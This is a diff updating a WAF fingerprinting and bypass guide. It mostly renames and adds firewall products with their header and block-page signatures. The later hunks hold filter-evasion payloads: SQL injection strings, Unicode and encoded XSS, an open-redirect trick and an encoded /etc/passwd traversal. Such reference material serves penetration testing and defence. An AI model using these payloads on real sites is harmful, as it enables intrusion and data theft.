@@ -83,7 +83,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            360 Firewall
+            360
         </td>
         <td>
             <ul>
@@ -91,13 +91,15 @@ Wanna fingerprint WAFs? Lets see how.
                 <li><b>Detection Methodology:</b></li>
                 <ul>
                     <li>Returns status code <code>493</code> upon unusual requests.</li>
-                    <li>On viewing source-code of error page, you will find reference to <code>wzws-waf-cgi/</code> directory.</li>
-                    <li>Blocked response page source contains:
+                    <li>Blockpage may contain reference to <code>wzws-waf-cgi/</code> directory.</li>
+                    <li>Blocked response page source may contain:
                     <ul>
                         <li>Reference to <code>wangshan.360.cn</code> URL.</li>
                         <li><code>Sorry! Your access has been intercepted because your links may threaten website security.</code> text snippet.</li>
                     </ul>
-                    <li>Response headers contain <code>X-Powered-By-360WZB</code> Header.</li>
+                    <li>Response headers may contain <code>X-Powered-By-360WZB</code> header.</li>
+                    <li>Blocked response headers contain unique header <code>WZWS-Ray</code>.</li>
+                    <li><code>Server</code> header may contain value <code>qianxin-waf</code>.</li>
                 </ul>
             </ul>
         </td>
@@ -119,7 +121,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Airlock (Phion/Ergon)
+            Airlock
         </td>
         <td>
             <ul>
@@ -142,7 +144,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            AlertLogic Firewall
+            AlertLogic
         </td>
         <td>
             <ul>
@@ -180,7 +182,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Anquanbao WAF
+            Anquanbao
         </td>
         <td>
             <ul>
@@ -206,22 +208,6 @@ Wanna fingerprint WAFs? Lets see how.
                     <li>Blocked response content contains <code>Sorry! your access has been intercepted by AnYu</code></li>
                     <li>Blocked response page contains <code>AnYu- the green channel</code> text.</li>
                     <li>Response headers may contain unusual header <code>WZWS-RAY</code>.</li>
-                </ul>
-            </ul>
-        </td>
-    </tr>
-    <tr>
-        <td>
-            Application Security Manager (F5 Networks)
-        </td>
-        <td>
-            <ul>
-                <li><b>Detectability: </b>Difficult</li>
-                <li><b>Detection Methodology:</b></li>
-                <ul>
-                    <li>Blocked response content contains warning<br>
-                        <code>The requested URL was rejected. Please consult with your administrator.</code>
-                    </li>
                 </ul>
             </ul>
         </td>
@@ -268,7 +254,36 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            ASP.NET Generic (IIS)
+            ArvanCloud
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li><code>Server</code> header contains <code>ArvanCloud</code> keyword.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            ASPA
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li><code>Server</code> header contains <code>ASPA-WAF</code> keyword.</li>
+                    <li>Response contain unique header <code>ASPA-Cache-Status</code> with content <code>HIT</code> or <code>MISS</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            ASP.NET Generic
         </td>
         <td>
             <ul>
@@ -288,7 +303,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Astra Protection
+            Astra
         </td>
         <td>
             <ul>
@@ -308,7 +323,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            AWS (Amazon)
+            AWS ELB
         </td>
         <td>
             <ul>
@@ -369,7 +384,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Barracuda WAF
+            Barracuda
         </td>
         <td>
             <ul>
@@ -389,7 +404,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Bekchy (Faydata)
+            Bekchy
         </td>
         <td>
             <ul>
@@ -398,6 +413,25 @@ Wanna fingerprint WAFs? Lets see how.
                 <ul>
                     <li>Blocked response headers contains <code>Bekchy - Access Denied</code>.</li>
                     <li>Blocked response page contains reference to <code>https://bekchy.com/report</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            BinarySec
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Moderate</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response headers contain:</li>
+                    <ul>
+                        <li><code>X-BinarySec-Via</code> field.</li>
+                        <li><code>X-BinarySec-NoCache</code> field.</li>
+                        <li><code>Server</code> header contains <code>BinarySec</code> keyword.</li>
+                    </ul>
                 </ul>
             </ul>
         </td>
@@ -424,22 +458,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Bluedon IST
-        </td>
-        <td>
-            <ul>
-                <li><b>Detectability: </b>Easy</li>
-                <li><b>Detection Methodology:</b></li>
-                <ul>
-                    <li><code>Server</code> header contains <code>BDWAF</code> field value.</li>
-                    <li>Blocked response page contains to <code>Bluedon Web Application Firewall</code> text snippet..</li>
-                </ul>
-            </ul>
-        </td>
-    </tr>
-    <tr>
-        <td>
-            BIG-IP ASM (F5 Networks)
+            BIG-IP ASM
         </td>
         <td>
             <ul>
@@ -455,20 +474,6 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            BinarySec WAF
-        </td>
-        <td>
-            <ul>
-                <li><b>Detectability: </b>Moderate</li>
-                <li><b>Detection Methodology:</b></li>
-                <ul>
-                    <li>Response headers contain <code>binarysec</code> keyword value.</li>
-                </ul>
-            </ul>
-        </td>
-    </tr>
-    <tr>
-        <td>
             BlockDos
         </td>
         <td>
@@ -477,6 +482,21 @@ Wanna fingerprint WAFs? Lets see how.
                 <li><b>Detection Methodology:</b></li>
                 <ul>
                     <li><code>Server</code> header contains value <code>BlockDos.net</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            Bluedon IST
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li><code>Server</code> header contains <code>BDWAF</code> field value.</li>
+                    <li>Blocked response page contains to <code>Bluedon Web Application Firewall</code> text snippet..</li>
                 </ul>
             </ul>
         </td>
@@ -607,6 +627,7 @@ Wanna fingerprint WAFs? Lets see how.
                     <li><code>Server</code> header field has value <code>cloudflare</code>.</li>
                     <li><code>Set-Cookie</code> response headers have <code>__cfuid=</code> cookie field.</li>
                     <li>Page content might have <code>Attention Required!</code> or <code>Cloudflare Ray ID:</code>.</li>
+                    <li>Page content may contain <code>DDoS protection by Cloudflare</code>as text.</li>
                     <li>You may encounter <code>CLOUDFLARE_ERROR_500S_BOX</code> upon hitting invalid URLs.</li>
                 </ul>
             </ul>
@@ -614,7 +635,23 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Cloudfront (Amazon)
+            CloudfloorDNS
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li><code>Server</code> header field has value <code>CloudfloorDNS WAF</code>.</li>
+                    <li>Block-page title might have <code>CloudfloorDNS - Web Application Firewall Error</code>.</li>
+                    <li>Page content may contain <code>www.cloudfloordns.com/contact</code> URL as a contact link.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            Cloudfront
         </td>
         <td>
             <ul>
@@ -642,7 +679,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            CrawlProtect (Jean-Denis Brun)
+            CrawlProtect
         </td>
         <td>
             <ul>
@@ -737,6 +774,20 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            e3Learning Security
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li><code>Server</code> header contains <code>e3Learning_WAF</code> keyword.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             EdgeCast (Verizon)
         </td>
         <td>
@@ -752,7 +803,27 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Expression Engine (EllisLab)
+            Eisoo Cloud
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page content may contain:</li>
+                        <ul>
+                            <li><code>/eisoo-firewall-block.css</code> reference.</li>
+                            <li><code>www.eisoo.com</code> URL.</li>
+                            <li><code>&copy; (year) Eisoo Inc.</code> keyword.</li>
+                        </ul>
+                    <li><code>Server</code> header has field value set to <code>EisooWAF-AZURE/EisooWAF</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            Expression Engine
         </td>
         <td>
             <ul>
@@ -768,7 +839,23 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Fortinet FortiWeb
+            F5 ASM
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Difficult</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response content contains warning<br>
+                        <code>The requested URL was rejected. Please consult with your administrator.</code>
+                    </li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            FortiWeb
         </td>
         <td>
             <ul>
@@ -823,6 +910,25 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            Huawei Cloud
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page contains:</li>
+                    <ul>
+                        <li>Reference to <code>account.hwclouds.com/static/error/images/404img.jpg</code> error image.</li>
+                        <li>Reference to <code>www.hwclouds.com</code> URL.</li>
+                        <li>Reference to <code>hws_security@{site.tld}</code> e-mail for reporting.</li>
+                    </ul>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             HyperGuard
         </td>
         <td>
@@ -851,7 +957,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Incapsula (Imperva)
+            Imperva Incapsula
         </td>
         <td>
             <ul>
@@ -874,7 +980,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Immunify360 (CloudLinux Inc.)
+            Immunify360
         </td>
         <td>
             <ul>
@@ -888,6 +994,39 @@ Wanna fingerprint WAFs? Lets see how.
                         <li><code>imunify360 preloader</code> if response type is JSON.</li>
                     </ul>
                     <li>Blocked response page contains <code>protected by Imunify360</code> text.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            IndusGuard
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Moderate</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li><code>Server</code> header contains value <code>IF_WAF</code>.</li>
+                    <li>Blocked response content contains warning<br><code>further investigation and remediation with a screenshot of this page.</code></li>
+                    <li>Response headers contain a unique header <code>X-Version</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            Instart DX
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response headers contain <code>X-Instart-Request-ID</code> unique header.</li>
+                    <li>Response headers contain <code>X-Instart-WL</code> unique header fingerprint.</li>
+                    <li>Response headers contain <code>X-Instart-Cache</code> unique header fingerprint.</li>
+                    <li>Blocked response page contains <code>The requested URL was rejected. Please consult with your administrator.</code> text.</li>
                 </ul>
             </ul>
         </td>
@@ -944,6 +1083,20 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            KeyCDN
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li><code>Server</code> header contains <code>KeyCDN</code> keyword.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             KnownSec
         </td>
         <td>
@@ -992,7 +1145,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Malcare (Inactiv)
+            Malcare
         </td>
         <td>
             <ul>
@@ -1011,7 +1164,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            MissionControl WAF
+            MissionControl Application Shield
         </td>
         <td>
             <ul>
@@ -1025,7 +1178,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            ModSecurity (Trustwave)
+            ModSecurity
         </td>
         <td>
             <ul>
@@ -1048,7 +1201,21 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            NAXSI (NBS Systems)
+            ModSecurity CRS
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Difficult</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blockpage occurs on adding a separate request header <code>X-Scanner</code> when set to a particular paranoa level.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            NAXSI
         </td>
         <td>
             <ul>
@@ -1080,7 +1247,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Netcontinuum (Barracuda)
+            Netcontinuum
         </td>
         <td>
             <ul>
@@ -1115,7 +1282,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            NevisProxy (AdNovum)
+            NevisProxy
         </td>
         <td>
             <ul>
@@ -1148,7 +1315,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Nexusguard Application Wall
+            Nexusguard
         </td>
         <td>
             <ul>
@@ -1162,7 +1329,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            NinjaFirewall (NinTechNet)
+            NinjaFirewall
         </td>
         <td>
             <ul>
@@ -1197,7 +1364,21 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            onMessage Shield (Blackbaud)
+            NullDDoS
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li><code>Server</code> header contains the <code>NullDDoS System</code> keyword.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            onMessage Shield
         </td>
         <td>
             <ul>
@@ -1249,6 +1430,21 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            PentaWAF
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li><code>Server</code> header contains <code>PentaWAF/{version}</code> keyword.</li>
+                    <li>Blocked response page contains text <code>PentaWAF/{version}</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             PerimeterX
         </td>
         <td>
@@ -1257,6 +1453,24 @@ Wanna fingerprint WAFs? Lets see how.
                 <li><b>Detection Methodology:</b></li>
                 <ul>
                     <li>Blocked response page contains reference to<br> <code>https://www.perimeterx.com/whywasiblocked</code> URL.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            pkSecurityModule IDS
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Moderate</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response content may contain</li>
+                    <ul>
+                        <li><code>pkSecurityModule: Security.Alert</code>.</li>
+                        <li><code>A safety critical request was discovered and blocked</code> text snippet.</li>
+                    </ul>
                 </ul>
             </ul>
         </td>
@@ -1272,6 +1486,25 @@ Wanna fingerprint WAFs? Lets see how.
                 <ul>
                     <li>Blocked response page contains <code>Forbidden</code> in <code>h1</code> followed by:</li>
                     <li><code>Request ID:</code> in format <code>yyyy-mm-dd-hh-mm-ss-{ref. code}</code></li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            PowerCDN
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Moderate</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response headers may contain</li>
+                    <ul>
+                        <li><code>Via</code> header with content <code>powercdn.com</code>.</li>
+                        <li><code>X-Cache</code> header with content <code>powercdn.com</code>.</li>
+                        <li><code>X-CDN</code> header with content <code>PowerCDN</code>.</li>
+                    </ul>
                 </ul>
             </ul>
         </td>
@@ -1307,17 +1540,30 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            pkSecurityModule IDS
+            Puhui
         </td>
         <td>
             <ul>
-                <li><b>Detectability: </b>Moderate</li>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li><code>Server</code> header contain <code>PuhuiWAF</code> keyword.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            Qiniu CDN
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
                 <li><b>Detection Methodology:</b></li>
                 <ul>
                     <li>Response content may contain</li>
                     <ul>
-                        <li><code>pkSecurityModule: Security.Alert</code>.</li>
-                        <li><code>A safety critical request was discovered and blocked</code> text snippet.</li>
+                        <li>Response headers contain unusual header <code>X-Qiniu-CDN</code> with value set to either <code>0</code> or <code>1</code>.</li>
                     </ul>
                 </ul>
             </ul>
@@ -1333,6 +1579,8 @@ Wanna fingerprint WAFs? Lets see how.
                 <li><b>Detection Methodology:</b></li>
                 <ul>
                     <li>Response page contains the following text snippet:<br> <code>Unauthorized Activity Has Been Detected.</code> and <code>Case Number</code></li>
+                    <li>Blocked response page has reference to <code>radwarealerting@{site.tld}</code> email.</li>
+                    <li>Blocked response page has title set to <code>Unauthorized Request Blocked</code>.</li>
                     <li>Response headers may contain <code>X-SL-CompState</code> header field name.</li>
                 </ul>
             </ul>
@@ -1361,7 +1609,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Request Validation Mode (ASP.NET)
+            Request Validation Mode
         </td>
         <td>
             <ul>
@@ -1382,7 +1630,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            RSFirewall (RSJoomla)
+            RSFirewall
         </td>
         <td>
             <ul>
@@ -1458,6 +1706,43 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            SecKing
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy/Moderate</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li><code>Server</code> header in response may contain:</li>
+                    <ul>
+                        <li><code>SECKINGWAF</code> keyword.</li>
+                        <li><code>SECKING/{version}</code> field value.</li>
+                    </ul>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            SecuPress
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response content may contain:</li>
+                    <ul>
+                        <li><code>SecuPress</code> as text.</li>
+                        <li><code>Block ID: Bad URL Contents</code> as text.</li>
+                    </ul>
+                    <li>Response code returned is <code>503 Service Unavailable</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             Secure Entry
         </td>
         <td>
@@ -1472,7 +1757,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            SecureIIS (eEye)
+            SecureIIS
         </td>
         <td>
             <ul>
@@ -1492,7 +1777,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            SecureSphere (Imperva)
+            SecureSphere
         </td>
         <td>
             <ul>
@@ -1511,7 +1796,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            SEnginx (Neusoft)
+            SEnginx
         </td>
         <td>
             <ul>
@@ -1525,7 +1810,21 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Shadow Daemon WAF
+            ServerDefender VP
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response contains <code>X-Pint</code> header field with <code>p80</code> keyword.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            Shadow Daemon
         </td>
         <td>
             <ul>
@@ -1612,7 +1911,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            SonicWall (Dell)
+            SonicWall
         </td>
         <td>
             <ul>
@@ -1666,7 +1965,22 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            StackPath (StackPath LLC)
+            SquidProxy IDS
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li><code>Server</code> header contains field value <code>squid/{version}</code>.</li>
+                    <li>Blocked response page contains<br> <code>Access control configuration prevents your request from being allowed at this time.</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            StackPath
         </td>
         <td>
             <ul>
@@ -1681,7 +1995,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Stingray (RiverBed/Brocade)
+            Stingray
         </td>
         <td>
             <ul>
@@ -1718,7 +2032,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Synology Cloud WAF
+            Synology Cloud
         </td>
         <td>
             <ul>
@@ -1732,7 +2046,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Tencent Cloud WAF
+            Tencent Cloud
         </td>
         <td>
             <ul>
@@ -1747,7 +2061,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Teros WAF (Citrix)
+            Teros
         </td>
         <td>
             <ul>
@@ -1761,7 +2075,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            TrafficShield (F5 Networks)
+            TrafficShield
         </td>
         <td>
             <ul>
@@ -1791,7 +2105,26 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            URLMaster SecurityCheck (iFinity/DotNetNuke)
+            UCloud UEWaf
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response content might contain:
+                    <ul>
+                        <li>Reference to <code>/uewaf_deny_pages/default/img/</code> inurl directory.</li>
+                        <li><code>ucloud.cn</code> URL.</li>
+                    </ul> 
+                    <li>Response headers returned has <code>Server</code> header set to <code>uewaf/{version}</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            URLMaster SecurityCheck
         </td>
         <td>
             <ul>
@@ -1811,7 +2144,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            URLScan (Microsoft)
+            URLScan
         </td>
         <td>
             <ul>
@@ -1863,7 +2196,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Varnish Cache
+            Varnish CacheWall
         </td>
         <td>
             <ul>
@@ -1879,6 +2212,26 @@ Wanna fingerprint WAFs? Lets see how.
             </ul>
         </td>
     </tr>
+    <tr>
+        <td>
+            Viettel
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response page contains:</li>
+                    <ul>
+                        <li>Block page has title set to <code>Access denied · Viettel WAF</code>.</li>
+                        <li>Reference to <code>https://cloudrity.com.vn/</code> URL.</li>
+                        <li>Response page contains keywords <code>Viettel WAF system</code>.</li>
+                        <li>Contact information reference to <code>https://cloudrity.com.vn/customer/#/contact</code> URL.</li>
+                    </ul>
+                </ul>
+            </ul>
+        </td>
+    </tr> 
     <tr>
         <td>
             VirusDie
@@ -1901,7 +2254,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            WallArm (Nginx)
+            WallArm
         </td>
         <td>
             <ul>
@@ -1934,7 +2287,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            WebARX Security Firewall
+            WebARX Security
         </td>
         <td>
             <ul>
@@ -1953,7 +2306,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            WebKnight (Aqtronix)
+            WebKnight
         </td>
         <td>
             <ul>
@@ -1974,7 +2327,36 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            WebSEAL (IBM)
+            WebLand
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li><code>Server</code> header contains <code>Apache Protected By WebLand WAF</code> keyword.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            WebRay
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li><code>Server</code> header contains <code>WebRay-WAF</code> keyword.</li>
+                    <li>Response headers may have <code>DrivedBy</code> field with value <code>RaySrv RayEng/{version}</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            WebSEAL
         </td>
         <td>
             <ul>
@@ -1993,7 +2375,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            WebTotem Firewall
+            WebTotem
         </td>
         <td>
             <ul>
@@ -2007,7 +2389,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>    
     <tr>
         <td>
-            West263CDN Firewall
+            West263CDN
         </td>
         <td>
             <ul>
@@ -2021,7 +2403,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>    
     <tr>
         <td>
-            Wordfence (Feedjit)
+            Wordfence
         </td>
         <td>
             <ul>
@@ -2042,7 +2424,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            WTS WAF
+            WTS-WAF
         </td>
         <td>
             <ul>
@@ -2136,6 +2518,22 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            YxLink
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response might have <code>yx_ci_session</code> cookie field.</li>
+                    <li>Response might have <code>yx_language</code> cookie field.</li>
+                    <li><code>Server</code> header contains <code>Yxlink-WAF</code> field value.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             ZenEdge
         </td>
         <td>
@@ -2152,7 +2550,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            ZScaler (Accenture)
+            ZScaler
         </td>
         <td>
             <ul>
@@ -2197,7 +2595,7 @@ Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:
 - This method often fails. 
 - Many a times your IP will be blocked (temporarily/permanently).
 
-### Regex-Reversing:
+### Regex Reversing:
 #### Method:
 - Most efficient method of bypassing WAFs.
 - Some WAFs rely upon matching the attack payloads with the signatures in their databases.
@@ -2205,12 +2603,16 @@ Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:
 
 #### Techniques:
 
-### Keyword Filter Detection/Bypass
+### Blacklisting Detection/Bypass
+
+- In this method we try to fingerprint the rules step by step by observing the keywords being blacklisted.
+- The idea is to guess the regex and craft the next payloads which doesn't use the blacklisted keywords.
 
 __Case__: SQL Injection
 
 ##### • Step 1:
 __Keywords Filtered__: `and`, `or`, `union`  
+__Probable Regex__: `preg_match('/(and|or|union)/i', $id)`  
 - __Blocked Attempt__: `union select user, password from users`
 - __Bypassed Injection__: `1 || (select user from users where user_id = 1) = 'admin'`
 
@@ -2284,7 +2686,7 @@ __Bypassed__: `%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F`
 __Blocked__: `uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)`  
 __Bypassed__: `uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29`
 
-__3. Unicode Encoding__  
+__3. Unicode Normalization__  
 - ASCII characters in unicode encoding encoding provide great variants for bypassing.
 - You can encode entire/part of the payload for obtaining results.
 
@@ -2294,10 +2696,14 @@ __Obfuscated__: `<marquee onstart=\u0070r\u06f\u006dpt()>`
 __Blocked__: `/?redir=http://google.com`  
 __Bypassed__: `/?redir=http://google。com` (Unicode alternative) 
 
+__Blocked__: `<marquee loop=1 onfinish=alert()>x`  
+__Bypassed__: `＜marquee loop＝1 onfinish＝alert︵1)>x` (Unicode alternative)
+> __TIP:__ Have a look at [this](https://hackerone.com/reports/231444) and [this](https://hackerone.com/reports/231389) reports on HackerOne. :)
+
 __Standard__: `../../etc/passwd`  
 __Obfuscated__: `%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd`
 
-__4. HTML Encoding__
+__4. HTML Representation__
 - Often web apps encode special characters into HTML encoding and render them accordingly.
 - This leads us to basic bypass cases with HTML encoding (numeric/generic).
 
